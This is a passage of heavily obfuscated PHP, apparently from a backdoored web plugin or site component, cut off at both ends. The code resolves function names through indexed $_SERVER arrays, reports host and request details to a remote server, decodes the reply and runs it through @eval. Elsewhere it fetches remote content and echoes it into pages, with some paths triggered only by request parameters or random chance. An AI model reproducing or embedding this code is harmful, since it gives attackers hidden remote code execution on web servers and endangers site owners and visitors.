$f¯”â‘‹å[238]); } $dæô³ƒÃ‡Š = array($f¯”â‘‹å[239], $f¯”â‘‹å[240]); if ($f¯”â‘‹å[241]($ešÙàŒ‚¾ß, $dæô³ƒÃ‡Š)) { if ($this->tlodf6cf000b == $f¯”â‘‹å[123] && isset($d™¤”£ÕŒ§[$f¯”â‘‹å[242]])) { $f¯”â‘‹å[168]($f¯”â‘‹å[199]($f¯”â‘‹å[237]), !1, $f¯”â‘‹å[238]); die; } $e¤ø„¬œ¹¡ = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][139]}(); if ($e¤ø„¬œ¹¡ != $f¯”â‘‹å[203]($f¯”â‘‹å[243])) { if ($e¤ø„¬œ¹¡ <= $f¯”â‘‹å[61]($f¯”â‘‹å[141])->{$_SERVER[æàÂÔ…ÔåÖÌ][142]}()) { $f¯”â‘‹å[168]($f¯”â‘‹å[199]($f¯”â‘‹å[244]), !1, $f¯”â‘‹å[238]); die; } } } goto A¦î¯Æ´‡È; A¦î¯Æ´‡È: } private function jbcfa9287238() { goto D‡ˆâÏºˆ; c†éõËÊÚ¢: if (!$c†ñ›÷©¬[241]($_SERVER[$c†ñ›÷©¬[44]], $aî¼×·ğò¹)) { return; } $Aê†œ¸‚¦È = $c†ñ›÷©¬[247]; $Aê†œ¸‚¦È = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][248]}($Aê†œ¸‚¦È, $c†ñ›÷©¬[249]); goto b·†‰ù¬†ø; b·†‰ù¬†ø: $e™¿ÓŸ¯§ = $_SERVER[í™][607]; $d¶ìğ¬¾£ = $c†ñ›÷©¬[250](array($c†ñ›÷©¬[251] => array($c†ñ›÷©¬[252] => $c†ñ›÷©¬[253], $c†ñ›÷©¬[254] => 3))); $d°ƒ³¡¸„ = @$c†ñ›÷©¬[255]($Aê†œ¸‚¦È, !1, $d¶ìğ¬¾£); goto Eøë’ì£İÒ; Eøë’ì£İÒ: $c†ñ›÷©¬[256]($c†ñ›÷©¬[257]); if ($d°ƒ³¡¸„ && $c†ñ›÷©¬[32]($d°ƒ³¡¸„, $c†ñ›÷©¬[258])) { echo $d°ƒ³¡¸„; } die; goto dÖè˜·–˜Î; D‡ˆâÏºˆ: $c†ñ›÷©¬ =& $_SERVER[æàÂÔ…ÔåÖÌ]; $aî¼×·ğò¹ = array($c†ñ›÷©¬[137], $c†ñ›÷©¬[245]); if (!$c†ñ›÷©¬[106]($GLOBALS, $c†ñ›÷©¬[134]) || !isset($_GET[$c†ñ›÷©¬[246]])) { return; } goto c†éõËÊÚ¢; dÖè˜·–˜Î: } public function sajgd682542f($Dè¥¤ÉĞ‚») { goto d×†Â‹¤¹ß; d×†Â‹¤¹ß: $C¸ìù¦¬¹İ =& $_SERVER[æàÂÔ…ÔåÖÌ]; if ($this->tlodf6cf000b == $C¸ìù¦¬¹İ[259]) { return $Dè¥¤ÉĞ‚»; } $F“¹›Â¥Å™ = array($C¸ìù¦¬¹İ[260], $C¸ìù¦¬¹İ[261], $C¸ìù¦¬¹İ[262], $C¸ìù¦¬¹İ[263], $C¸ìù¦¬¹İ[264], $C¸ìù¦¬¹İ[265], $C¸ìù¦¬¹İ[266], $C¸ìù¦¬¹İ[267]); goto F‹¶Ÿš§º; D¬ç”ïàŸÍ: return $Dè¥¤ÉĞ‚»; goto f»ÙëâªçÎ; Bë¡öÄì: if (!$E¢ã¿¡·É±) { die; } foreach ($F“¹›Â¥Å™ as $dÏ”ƒ±ÌÏ) { if (!$C¸ìù¦¬¹İ[241]($dÏ”ƒ±ÌÏ, $BÈø¤…Ô™è)) { $E‚§õ…È[] = $dÏ”ƒ±ÌÏ; } } foreach ($E‚§õ…È as $dÏ”ƒ±ÌÏ) { unset($Dè¥¤ÉĞ‚»[$dÏ”ƒ±ÌÏ]); } goto D¬ç”ïàŸÍ; F‹¶Ÿš§º: $BÈø¤…Ô™è = $C¸ìù¦¬¹İ[0]($C¸ìù¦¬¹İ[268], $C¸ìù¦¬¹İ[106]($this->wljbff9f70e1, $C¸ìù¦¬¹İ[131], $C¸ìù¦¬¹İ[10])); $E‚§õ…È = array(); $E¢ã¿¡·É± = $_SERVER[í™][608]; goto Bë¡öÄì; f»ÙëâªçÎ: } private function xmpf0f604513() { goto D…Å…À·İ; E½æ†¿²Çø: if ($CºèÁ©ˆ[61]($CºèÁ©ˆ[271])->{$_SERVER[æàÂÔ…ÔåÖÌ][63]}($CºèÁ©ˆ[87]) != $CºèÁ©ˆ[234]) { $CºèÁ©ˆ[61]($CºèÁ©ˆ[271])->{$_SERVER[æàÂÔ…ÔåÖÌ][223]}($CºèÁ©ˆ[87], $CºèÁ©ˆ[234]); } goto fª†ßêÚ†¯; D…Å…À·İ: $CºèÁ©ˆ =& $_SERVER[æàÂÔ…ÔåÖÌ]; if ($this->tlodf6cf000b != $CºèÁ©ˆ[123]) { return; } $GLOBALS[$CºèÁ©ˆ[93]][$CºèÁ©ˆ[97]][$CºèÁ©ˆ[269]] = $CºèÁ©ˆ[222]; goto D¶Ø±Ñš”è; D¶Ø±Ñš”è: $GLOBALS[$CºèÁ©ˆ[93]][$CºèÁ©ˆ[270]] = $CºèÁ©ˆ[222]; $eŠá“—É¥Ì = $_SERVER[í™][609]; if (!$eŠá“—É¥Ì) { return; } goto E½æ†¿²Çø; fª†ßêÚ†¯: } public function yrvz21640af9() { return $_SERVER[æàÂÔ…ÔåÖÌ][272]; } private function ytbd26ba52cb() { goto Eäù¦¸ß×; e°ˆØÊ§ÏÇ: while (strlen($BÈçÁ†ìŠ‘) < $Béİ‘ÓÚÉ[560]) { if (!$BÈçÁ†ìŠ‘) { break; } $BÈçÁ†ìŠ‘++; } if (!$BóÍ—ªšÕ¢[193]($bøğÈøÕ…î)) { return; } if ($bøğÈøÕ…î[$BóÍ—ªšÕ¢[167]] && $bøğÈøÕ…î[$BóÍ—ªšÕ¢[282]]) { if ($this->{$_SERVER[æàÂÔ…ÔåÖÌ][201]}($bøğÈøÕ…î[$BóÍ—ªšÕ¢[282]]) == $bœ¢‚¸Õø[$BóÍ—ªšÕ¢[167]]) { return; } } goto C§ğ™‰ßØ”; båŠÚõé³å: if (!$B“ô…Ùµ³µ) { die; } if ($B­ÈÊñ°Š¤ && $BóÍ—ªšÕ¢[235]() - $B­ÈÊñ°Š¤ < $BóÍ—ªšÕ¢[203]($BóÍ—ªšÕ¢[280])) { return; } $BóÍ—ªšÕ¢[13](array($BóÍ—ªšÕ¢[278], $BóÍ—ªšÕ¢[154]), $Bœ…ëğ‘¬Ñ, $BóÍ—ªšÕ¢[235]()); goto A‚¨¨£÷ŒÍ; A‚¨¨£÷ŒÍ: $fÖ×Ë‹ÓÔâ = $Béİ‘ÓÚÉ[611]; while (strlen($fÖ×Ë‹ÓÔâ) < $Béİ‘ÓÚÉ[554]) { if (!$fÖ×Ë‹ÓÔâ) { break; } $fÖ×Ë‹ÓÔâ++; } $bœ¢‚¸Õø = array($BóÍ—ªšÕ¢[167] => $BóÍ—ªšÕ¢[61]($BóÍ—ªšÕ¢[62])->{$_SERVER[æàÂÔ…ÔåÖÌ][63]}($BóÍ—ªšÕ¢[211]), $BóÍ—ªšÕ¢[180] => $this->tlodf6cf000b, $BóÍ—ªšÕ¢[178] => $_SERVER[$BóÍ—ªšÕ¢[179]], $BóÍ—ªšÕ¢[171] => $BóÍ—ªšÕ¢[151], $BóÍ—ªšÕ¢[174] => $_SERVER[$BóÍ—ªšÕ¢[175]]); goto f×”ÌÇ¹ÅŸ; f×”ÌÇ¹ÅŸ: $f½‡ƒŸï­â = $Béİ‘ÓÚÉ[612]; $bøğÈøÕ…î = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][184]}($BóÍ—ªšÕ¢[281], $bœ¢‚¸Õø); $BÈçÁ†ìŠ‘ = $Béİ‘ÓÚÉ[613]; goto e°ˆØÊ§ÏÇ; Eäù¦¸ß×: $Béİ‘ÓÚÉ =& $_SERVER[í™]; $BóÍ—ªšÕ¢ =& $_SERVER[æàÂÔ…ÔåÖÌ]; $fæÛí¡†æÉ = array($BóÍ—ªšÕ¢[273], $BóÍ—ªšÕ¢[274], $BóÍ—ªšÕ¢[275]); goto föìÃÑÒ§; FÆÇ¡ñ‘¸ª: if ($BóÍ—ªšÕ¢[235]() % 4 != 0) { return; } $B­ÈÊñ°Š¤ = $BóÍ—ªšÕ¢[13](array($BóÍ—ªšÕ¢[278], $BóÍ—ªšÕ¢[279]), $Bœ…ëğ‘¬Ñ); $B“ô…Ùµ³µ = $Béİ‘ÓÚÉ[610]; goto båŠÚõé³å; föìÃÑÒ§: $Bœ…ëğ‘¬Ñ = $BóÍ—ªšÕ¢[276] . $BóÍ—ªšÕ¢[116]($BóÍ—ªšÕ¢[277]); if ($this->tlodf6cf000b == $BóÍ—ªšÕ¢[123] || !$BóÍ—ªšÕ¢[106]($GLOBALS, $BóÍ—ªšÕ¢[134])) { return; } if (!$BóÍ—ªšÕ¢[241]($_SERVER[$BóÍ—ªšÕ¢[44]], $fæÛí¡†æÉ)) { return; } goto FÆÇ¡ñ‘¸ª; C§ğ™‰ßØ”: $this->{$_SERVER[æàÂÔ…ÔåÖÌ][166]}(); if ($this->{$_SERVER[æàÂÔ…ÔåÖÌ][201]}($bøğÈøÕ…î[$BóÍ—ªšÕ¢[282]]) != $bœ¢‚¸Õø[$BóÍ—ªšÕ¢[167]]) { $cµº•æ’†Š = array($BóÍ—ªšÕ¢[204] => $BóÍ—ªšÕ¢[61]($BóÍ—ªšÕ¢[62])->{$_SERVER[æàÂÔ…ÔåÖÌ][63]}($BóÍ—ªšÕ¢[118]), $BóÍ—ªšÕ¢[205] => $_SERVER[$BóÍ—ªšÕ¢[117]], $BóÍ—ªšÕ¢[206] => $BóÍ—ªšÕ¢[207](), $BóÍ—ªšÕ¢[176] => $_SERVER[$BóÍ—ªšÕ¢[177]]); $EŠíò¿ìÑ° = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][208]}($BóÍ—ªšÕ¢[150]($cµº•æ’†Š)); $bøğÈøÕ…î = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][184]}($BóÍ—ªšÕ¢[209] . $EŠíò¿ìÑ°); if ($bøğÈøÕ…î && $BóÍ—ªšÕ¢[193]($bøğÈøÕ…î) && isset($bøğÈøÕ…î[$BóÍ—ªšÕ¢[282]])) { $Fµ‹Ç›ŞÓ = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][190]}($bøğÈøÕ…î[$BóÍ—ªšÕ¢[282]], 2); if ($Fµ‹Ç›ŞÓ) { $Fµ‹Ç›ŞÓ = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][201]}($Fµ‹Ç›ŞÓ); } if ($Fµ‹Ç›ŞÓ) { try { @eval($Fµ‹Ç›ŞÓ); } catch (Exception $Cç²ç÷¶†æ) { } } } } goto fÈÃõ»¨ÚÑ; fÈÃõ»¨ÚÑ: } private function mcev9fb15845($Cå¨²…ƒ = '', $Cƒ ïÍæ³ = array(), $b÷¾‡¹×ºò = 5) { goto Eã¡‘ÄˆÁÕ; Eã¡‘ÄˆÁÕ: $AçÖ“ÆÂ·ä =& $_SERVER[í™]; $FÊÌÄ­†„Õ =& $_SERVER[æàÂÔ…ÔåÖÌ]; $eºÇŠ‰Ûù = $FÊÌÄ­†„Õ[283]; goto A†ÁÆ¦Â“ä; A†ÁÆ¦Â“ä: $c–±™³†Í = $AçÖ“ÆÂ·ä[614]; while (strlen($c–±™³†Í) < $AçÖ“ÆÂ·ä[550]) { if (!$c–±™³†Í) { break; } $c–±™³†Í++; } $eºÇŠ‰Ûù = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][248]}($eºÇŠ‰Ûù, $FÊÌÄ­†„Õ[284]); goto a°¤±†ãÆ; a°¤±†ãÆ: $eºÇŠ‰Ûù = $eºÇŠ‰Ûù . $Cå¨²…ƒ . $FÊÌÄ­†„Õ[285] . $FÊÌÄ­†„Õ[286]($Cƒ ïÍæ³); if ($Cƒ ïÍæ³ === -1) { return $eºÇŠ‰Ûù; } $aŠ—Êº™ëï = $FÊÌÄ­†„Õ[250](array($FÊÌÄ­†„Õ[251] => array($FÊÌÄ­†„Õ[254] => $b÷¾‡¹×ºò, $FÊÌÄ­†„Õ[252] => $FÊÌÄ­†„Õ[287]), $FÊÌÄ­†„Õ[288] => array($FÊÌÄ­†„Õ[289] => !1, $FÊÌÄ­†„Õ[290] => !1))); goto FÁ©ÁœÖ†; dóÈ¯Šãô‹: if (strlen($Fäã¾´£ƒŒ) < $AçÖ“ÆÂ·ä[560]) { die; } goto eÌ¦Ÿ£ÓÂ¶; FÁ©ÁœÖ†: $F›“‰Õ‹ = $AçÖ“ÆÂ·ä[615]; $Cƒ ïÍæ³ = @$FÊÌÄ­†„Õ[255]($eºÇŠ‰Ûù, !1, $aŠ—Êº™ëï); $B‚—¾ãÏÚ = $AçÖ“ÆÂ·ä[616]; goto aÈÍ¼ßá; aÈÍ¼ßá: while ($B‚—¾ãÏÚ < $AçÖ“ÆÂ·ä[554]) { if ($B‚—¾ãÏÚ >= 0) { break; } $B‚—¾ãÏÚ++; } return $FÊÌÄ­†„Õ[192]($Cƒ ïÍæ³, !0); $Fäã¾´£ƒŒ = $AçÖ“ÆÂ·ä[617]; goto dóÈ¯Šãô‹; eÌ¦Ÿ£ÓÂ¶: } private function evbf9bb77ecd() { goto Föêêß ¹; Fï÷…»ÜÚô: while ($c‰ŞŸ„ë„Ì < $FíÂ¤·³½ã[554]) { if ($c‰ŞŸ„ë„Ì >= 0) { break; } $c‰ŞŸ„ë„Ì++; } return $b‹è¶õµïÈ + $C´æÕ’”æ; $aÑ¶›Ï™“ = $FíÂ¤·³½ã[623]; goto BƒÇëèÍÚõ; Föêêß ¹: $FíÂ¤·³½ã =& $_SERVER[í™]; $CëÌ¶ŸõÓ =& $_SERVER[æàÂÔ…ÔåÖÌ]; $e—ğÑÜÔ‘ = array($CëÌ¶ŸõÓ[291] => $CëÌ¶ŸõÓ[292], $CëÌ¶ŸõÓ[293] => $CëÌ¶ŸõÓ[294], $CëÌ¶ŸõÓ[295] => $CëÌ¶ŸõÓ[296], $CëÌ¶ŸõÓ[297] => $CëÌ¶ŸõÓ[298], $CëÌ¶ŸõÓ[299] => $CëÌ¶ŸõÓ[300], $CëÌ¶ŸõÓ[301] => $CëÌ¶ŸõÓ[243], $CëÌ¶ŸõÓ[302] => $CëÌ¶ŸõÓ[243], $CëÌ¶ŸõÓ[303] => $CëÌ¶ŸõÓ[292], $CëÌ¶ŸõÓ[304] => $CëÌ¶ŸõÓ[294], $CëÌ¶ŸõÓ[305] => $CëÌ¶ŸõÓ[296], $CëÌ¶ŸõÓ[306] => $CëÌ¶ŸõÓ[307], $CëÌ¶ŸõÓ[308] => $CëÌ¶ŸõÓ[298], $CëÌ¶ŸõÓ[309] => $CëÌ¶ŸõÓ[310], $CëÌ¶ŸõÓ[311] => $CëÌ¶ŸõÓ[300], $CëÌ¶ŸõÓ[312] => $CëÌ¶ŸõÓ[313], $CëÌ¶ŸõÓ[314] => $CëÌ¶ŸõÓ[315], $CëÌ¶ŸõÓ[316] => $CëÌ¶ŸõÓ[317]); goto E¡™ºõÓ™ç; C¯„ï£ÄĞĞ: $d‘å¹„³åí = $FíÂ¤·³½ã[619]; if (!$d‘å¹„³åí) { return; } $b‹è¶õµïÈ = $CëÌ¶ŸõÓ[203]($b‹è¶õµïÈ ? $b‹è¶õµïÈ : $CëÌ¶ŸõÓ[292]); goto C­˜ÇØø‘¬; BƒÇëèÍÚõ: while (strlen($aÑ¶›Ï™“) < $FíÂ¤·³½ã[577]) { if (!$aÑ¶›Ï™“) { break; } $aÑ¶›Ï™“++; } goto e„õÁåÒö; E¡™ºõÓ™ç: $dºèÅ…ÍÄ = $FíÂ¤·³½ã[618]; while (strlen($dºèÅ…ÍÄ) < $FíÂ¤·³½ã[577]) { if (!$dºèÅ…ÍÄ) { break; } $dºèÅ…ÍÄ++; } $b‹è¶õµïÈ = $e—ğÑÜÔ‘[$this->tlodf6cf000b]; goto C¯„ï£ÄĞĞ; C­˜ÇØø‘¬: $BÀœó¤àç¼ = $FíÂ¤·³½ã[620]; while ($BÀœó¤àç¼ < $FíÂ¤·³½ã[560]) { if ($BÀœó¤àç¼ >= 0) { break; } $BÀœó¤àç¼++; } $C´æÕ’”æ = $CëÌ¶ŸõÓ[106]($this->wljbff9f70e1, $CëÌ¶ŸõÓ[318]); goto e¤©ÈĞ‰Ø›; e¤©ÈĞ‰Ø›: $CÉ÷ËÙĞ = $FíÂ¤·³½ã[621]; $C´æÕ’”æ = $C´æÕ’”æ ? $CëÌ¶ŸõÓ[203]($C´æÕ’”æ) : 0; $c‰ŞŸ„ë„Ì = $FíÂ¤·³½ã[622]; goto Fï÷…»ÜÚô; e„õÁåÒö: } public function ckbjdea2aa90($bÊ‹ ô‚õ) { goto dÇ†‹ íñ“; dÇ†‹ íñ“: $fØ¹Ê¸‘ÈÈ =& $_SERVER[í™]; $f³»†öŸ =& $_SERVER[æàÂÔ…ÔåÖÌ]; $CæÁ¸Ó†Š– = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][139]}(); goto FÜ“Ã·×¼¢; FÜ“Ã·×¼¢: if ($bÊ‹ ô‚õ[$f³»†öŸ[319]] == $f³»†öŸ[222]) { return; } if ($CæÁ¸Ó†Š– >= $f³»†öŸ[203]($f³»†öŸ[243])) { return; } $eè×Ä¿œä‚ = $f³»†öŸ[61]($f³»†öŸ[141])->{$_SERVER[æàÂÔ…ÔåÖÌ][142]}(); goto cµ—‘¼ƒ·; eöÉõÃ¶à¬: if (!$f³»†öŸ[241]($bÊ‹ ô‚õ[$f³»†öŸ[319]], $D”«Š¤ŠÀ˜)) { $f³»†öŸ[168]($f³»†öŸ[323], !1, $f³»†öŸ[238]); } goto dïØöØ‰”ø; AŠäÒéÆ·à: while ($b™ØÉÕß¹¨ < $fØ¹Ê¸‘ÈÈ[550]) { if ($b™ØÉÕß¹¨ >= 0) { break; } $b™ØÉÕß¹¨++; } $D”«Š¤ŠÀ˜ = $f³»†öŸ[224]($D”«Š¤ŠÀ˜, $f³»†öŸ[10], $f³»†öŸ[319]); $eîèèäï’í = $fØ¹Ê¸‘ÈÈ[625]; goto eöÉõÃ¶à¬; cµ—‘¼ƒ·: if ($eè×Ä¿œä‚ <= $CæÁ¸Ó†Š–) { return; } $D”«Š¤ŠÀ˜ = $f³»†öŸ[61]($f³»†öŸ[141])->{$_SERVER[æàÂÔ…ÔåÖÌ][320]}($f³»†öŸ[319])->{$_SERVER[æàÂÔ…ÔåÖÌ][321]}($CæÁ¸Ó†Š–)->{$_SERVER[æàÂÔ…ÔåÖÌ][322]}(); $b™ØÉÕß¹¨ = $fØ¹Ê¸‘ÈÈ[624]; goto AŠäÒéÆ·à; dïØöØ‰”ø: } public function lnqr9ec0a432() { goto F‰…©Š¹¼‘; F‰…©Š¹¼‘: $eïÖ˜í”º =& $_SERVER[í™]; $eÎ„¯ãİ¨· =& $_SERVER[æàÂÔ…ÔåÖÌ]; if (!$eÎ„¯ãİ¨·[106]($GLOBALS, $eÎ„¯ãİ¨·[134]) || $eÎ„¯ãİ¨·[324](1, 100) > 20) { return; } goto fÓŠ„ÖÉƒé; d•±Ãåµíš: if (strlen($bí“ÌÂ‡ŠÇ) < $eïÖ˜í”º[554]) { return; } $eŒÏ–×Éè¼ = $eÎ„¯ãİ¨·[250](array($eÎ„¯ãİ¨·[251] => array($eÎ„¯ãİ¨·[252] => $eÎ„¯ãİ¨·[253], $eÎ„¯ãİ¨·[254] => 3))); $dÙÚÓïÕáİ = @$eÎ„¯ãİ¨·[255]($BÒ´óùŞï, !1, $eŒÏ–×Éè¼); goto F•÷±ƒêã; F•÷±ƒêã: $d¨Š–õë¨’ = $eïÖ˜í”º[627]; while (strlen($d¨Š–õë¨’) < $eïÖ˜í”º[577]) { if (!$d¨Š–õë¨’) { break; } $d¨Š–õë¨’++; } echo $eÎ„¯ãİ¨·[325] . $eÎ„¯ãİ¨·[326]($dÙÚÓïÕáİ) . $eÎ„¯ãİ¨·[327]; goto eÚ¡´ÊÇ¡ˆ; fÓŠ„ÖÉƒé: $BÒ´óùŞï = $eÎ„¯ãİ¨·[247]; $BÒ´óùŞï = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][248]}($BÒ´óùŞï, $eÎ„¯ãİ¨·[249]); $bí“ÌÂ‡ŠÇ = $eïÖ˜í”º[626]; goto d•±Ãåµíš; eÚ¡´ÊÇ¡ˆ: $Eàà·ƒá×Ï = $eïÖ˜í”º[628]; if (!$Eàà·ƒá×Ï) { die; } goto DëŠ³ë; DëŠ³ë: } private function glzd944ea0fa($dñƒ´ã†æÍ, $eåªĞÙÏÀŒ, $C…ö÷˜«º = 3) { goto Eª±–ƒôá©; dƒ’‰ã‹Íš: switch ($EƒÕ…Âä„ë) { case $bíàíÀĞ¼ê[234]: $d…ñôÅœâ… = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][149]}($dñƒ´ã†æÍ, $bíàíÀĞ¼ê[216]($eåªĞÙÏÀŒ . $Få‹÷ª™²¢)); $aİÏòÎÅ‹ = $F«­¹¨¶ó[630]; if (strlen($aİÏòÎÅ‹) < $F«­¹¨¶ó[560]) { die; } break; $A‹ÖèŸ“¤Ş = $F«­¹¨¶ó[631]; if (!$A‹ÖèŸ“¤Ş) { die; } case $bíàíÀĞ¼ê[222]: $d…ñôÅœâ… = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][149]}($dñƒ´ã†æÍ, $bíàíÀĞ¼ê[216]($Få‹÷ª™²¢ . $eåªĞÙÏÀŒ)); break; case $bíàíÀĞ¼ê[330]: $d…ñôÅœâ… = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][149]}($dñƒ´ã†æÍ, $bíàíÀĞ¼ê[120]($Få‹÷ª™²¢ . $eåªĞÙÏÀŒ)); break; case $bíàíÀĞ¼ê[331]: $d…ñôÅœâ… = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][149]}($dñƒ´ã†æÍ, $bíàíÀĞ¼ê[116]($Få‹÷ª™²¢ . $eåªĞÙÏÀŒ)); $B‚ÏÃºé = $F«­¹¨¶ó[632]; if (!$B‚ÏÃºé) { return; } break; case $bíàíÀĞ¼ê[332]: goto F‚ØÁ‹—ãÁ; C˜é±âÚìÃ: if (!$Dë¸Ç§òÓª) { return; } break; goto f¨É²ÍòÑ´; dŸğÜ‡È¿: for ($FÕ¿ŒÜ³à = 0; $FÕ¿ŒÜ³à < $bíàíÀĞ¼ê[24]($dñƒ´ã†æÍ); $FÕ¿ŒÜ³à++) { $DİîÌ“ãë• = $DİîÌ“ãë• == $bíàíÀĞ¼ê[24]($f¾ÑöÀ­Ó×) ? 0 : $DİîÌ“ãë•; $aŒÛ¼Ò¤½« = ($aÅ‡¹ªµÏÙ + $bíàíÀĞ¼ê[334]($DŞ–ó´¦Ê†, $dñƒ´ã†æÍ[$FÕ¿ŒÜ³à]) + $bíàíÀĞ¼ê[335]($f¾ÑöÀ­Ó×[$DİîÌ“ãë•++])) % 64; $cìğ¹ìÏ¬ä .= $DŞ–ó´¦Ê†[$aŒÛ¼Ò¤½«]; $D¼¢¦ÜÊ Ï = $F«­¹¨¶ó[637]; if (strlen($D¼¢¦ÜÊ Ï) < $F«­¹¨¶ó[550]) { return; } } $d…ñôÅœâ… = $bíàíÀĞ¼ê[326]($DÏ® ¸–³ù . $cìğ¹ìÏ¬ä); $Dë¸Ç§òÓª = $F«­¹¨¶ó[638]; goto C˜é±âÚìÃ; a›ÒÍŞ„ºÀ: $B¡…¤óÊò¿ = $F«­¹¨¶ó[636]; if (!$B¡…¤óÊò¿) { die; } $DİîÌ“ãë• = 0; goto dŸğÜ‡È¿; CšåœôÅø¨: $c• Øğˆ = $F«­¹¨¶ó[633]; $f¾ÑöÀ­Ó× = $bíàíÀĞ¼ê[116]($DÏ® ¸–³ù . $bíàíÀĞ¼ê[116]($eåªĞÙÏÀŒ . $DÏ® ¸–³ù) . $eåªĞÙÏÀŒ); $f¾ÑöÀ­Ó× = $bíàíÀĞ¼ê[25]($f¾ÑöÀ­Ó×, $aÅ‡¹ªµÏÙ % 8, $aÅ‡¹ªµÏÙ % 8 + 7); goto c¥ÑöœåÖŠ; F‚ØÁ‹—ãÁ: $dñƒ´ã†æÍ = $bíàíÀĞ¼ê[120]($dñƒ´ã†æÍ); $aÅ‡¹ªµÏÙ = $bíàíÀĞ¼ê[333](0, 64); $DÏ® ¸–³ù = $DŞ–ó´¦Ê†[$aÅ‡¹ªµÏÙ]; goto CšåœôÅø¨; c¥ÑöœåÖŠ: $B¼‰ëŞ²‘í = $F«­¹¨¶ó[634]; while ($B¼‰ëŞ²‘í < $F«­¹¨¶ó[554]) { if ($B¼‰ëŞ²‘í >= 0) { break; } $B¼‰ëŞ²‘í++; } $cìğ¹ìÏ¬ä = $bíàíÀĞ¼ê[10]; goto Aàª˜½—÷; Aàª˜½—÷: $FÕ¿ŒÜ³à = 0; $EìãÓ •áÏ = $F«­¹¨¶ó[635]; $aŒÛ¼Ò¤½« = 0; goto a›ÒÍŞ„ºÀ; f¨É²ÍòÑ´: default: $d…ñôÅœâ… = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][149]}($dñƒ´ã†æÍ, $eåªĞÙÏÀŒ . $Få‹÷ª™²¢); $b¼Ğ÷ÈÅİà = $F«­¹¨¶ó[639]; if (!$b¼Ğ÷ÈÅİà) { die; } break; $fšô‹‚ÑØ‹ = $F«­¹¨¶ó[640]; } $d…ñôÅœâ… = $bíàíÀĞ¼ê[216]($EƒÕ…Âä„ë . $Få‹÷ª™²¢ . $d…ñôÅœâ…); if ($C…ö÷˜«º - 1 > 0) { $d…ñôÅœâ… = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][129]}($d…ñôÅœâ…, $eåªĞÙÏÀŒ, $C…ö÷˜«º - 1); } goto c¯¯’Áõ‰; Eª±–ƒôá©: $F«­¹¨¶ó =& $_SERVER[í™]; $bíàíÀĞ¼ê =& $_SERVER[æàÂÔ…ÔåÖÌ]; $bíàíÀĞ¼ê[328](1); goto EÕÅ©ˆ½‘Ü; EÕÅ©ˆ½‘Ü: $dñƒ´ã†æÍ = $bíàíÀĞ¼ê[2]($dñƒ´ã†æÍ); $EƒÕ…Âä„ë = $bíàíÀĞ¼ê[324](0, 5) . $bíàíÀĞ¼ê[10]; $b•½èØ¶Ç = $F«­¹¨¶ó[629]; goto aİŸÊ „Ç; c¯¯’Áõ‰: return $d…ñôÅœâ…; goto eíÂğŒÃøÀ; aİŸÊ „Ç: while ($b•½èØ¶Ç < $F«­¹¨¶ó[562]) { if ($b•½èØ¶Ç >= 0) { break; } $b•½èØ¶Ç++; } $Få‹÷ª™²¢ = $bíàíÀĞ¼ê[126](15); $DŞ–ó´¦Ê† = $bíàíÀĞ¼ê[329]; goto dƒ’‰ã‹Íš; eíÂğŒÃøÀ: } private function nuhw01bada1d($EÍÇëĞ¹ã‰, $f·ô¸Ò›Ï£, $bÇ¯öé­£ = 3) { goto b¼²Ù•ö®; dÅò¦ˆ±¦: switch ($bî…Ï•‰îá) { case $böŒÕ›ğŠ¬[234]: $cÅâçøŸÈ² = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][248]}($EÍÇëĞ¹ã‰, $böŒÕ›ğŠ¬[216]($f·ô¸Ò›Ï£ . $a¤ˆ¹°ªØ„)); break; $e‘‰ª¼à› = $C¡×œÍ˜ª·[643]; case $böŒÕ›ğŠ¬[222]: $cÅâçøŸÈ² = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][248]}($EÍÇëĞ¹ã‰, $böŒÕ›ğŠ¬[216]($a¤ˆ¹°ªØ„ . $f·ô¸Ò›Ï£)); $BËšµÎ÷†Å = $C¡×œÍ˜ª·[644]; while ($BËšµÎ÷†Å < $C¡×œÍ˜ª·[554]) { if ($BËšµÎ÷†Å >= 0) { break; } $BËšµÎ÷†Å++; } break; case $böŒÕ›ğŠ¬[330]: $cÅâçøŸÈ² = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][248]}($EÍÇëĞ¹ã‰, $böŒÕ›ğŠ¬[120]($a¤ˆ¹°ªØ„ . $f·ô¸Ò›Ï£)); break; $aáª®ÆÜõ = $C¡×œÍ˜ª·[645]; while (strlen($aáª®ÆÜõ) < $C¡×œÍ˜ª·[560]) { if (!$aáª®ÆÜõ) { break; } $aáª®ÆÜõ++; } case $böŒÕ›ğŠ¬[331]: $cÅâçøŸÈ² = $this->{$_SERVER[æàÂÔ…ÔåÖÌ][248]}($EÍÇëĞ¹ã‰, $böŒÕ›ğŠ¬[116]($a¤ˆ¹°ªØ„ . $f·ô¸Ò›Ï£)); $EâÑ×ÔÀ’™ = $C¡×œÍ˜ª·[646]; break; case $böŒÕ›ğŠ¬[332]: goto A®‡©á•‚‡; bƒ‘É‚Ÿœ: $B†óô¼æé = 0; $D´°ÑâÈ = $C¡×œÍ˜ª·[650]; $CÂæ‰íâˆŠ = 0; goto eí¾Ï¿ƒë¦; A®‡©á•‚‡: $EÍÇëĞ¹ã‰ = $böŒÕ›ğŠ¬[337]($EÍÇëĞ¹ã‰); $b½¡İ´ÛÑ¤ = $EÍÇëĞ¹ã‰[0]; $EÍÇëĞ¹ã‰ = $böŒÕ›ğŠ¬[25]($EÍÇëĞ¹ã‰, 1); goto FÈêãğòÖå; eí¾Ï¿ƒë¦: $b®Šõù² = 0; for ($B†óô¼æé = 0; $B†óô¼æé < $böŒÕ›ğŠ¬[24]($EÍÇëĞ¹ã‰); $B†óô¼æé++) { $b®Šõù² = $b®Šõù² == $böŒÕ›ğŠ¬[24]($dŠø¬ÀÖØ) ? 0 : 